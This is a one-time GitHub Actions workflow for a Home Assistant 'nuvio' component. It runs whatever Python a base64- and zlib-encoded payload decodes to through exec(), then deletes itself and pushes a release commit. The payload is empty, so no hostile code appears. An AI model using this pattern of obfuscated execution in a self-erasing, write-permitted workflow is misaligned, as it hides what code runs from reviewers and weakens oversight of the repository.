name: Implement HDMI display routing (one-time)
on:
  push:
    branches:
      - release/0.4.60-hdmi-input-routing
    paths:
      - .github/workflows/nuvio-display-routing-once.yml
permissions:
  contents: write
jobs:
  implement:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: release/0.4.60-hdmi-input-routing
      - name: Apply HDMI display routing and visual editor
        run: |
          python - <<'PY'
          import base64,zlib
          payload=''.join('''





'''.split())
          exec(zlib.decompress(base64.b64decode(payload)).decode('utf-8'))
          PY
      - name: Validate JavaScript and card behavior
        run: |
          node --check custom_components/nuvio/frontend/nuvio-card.js
          npm ci --prefix tests
          node tests/test_card.cjs
          python -m compileall -q custom_components/nuvio
      - name: Commit just the implementation
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git rm .github/workflows/nuvio-display-routing-once.yml
          git add custom_components/nuvio/frontend/nuvio-card.js custom_components/nuvio/manifest.json README.md tests/test_card.cjs
          git commit -m 'Release 0.4.60: route playback devices to physical TV HDMI inputs'
          git push origin HEAD:release/0.4.60-hdmi-input-routing
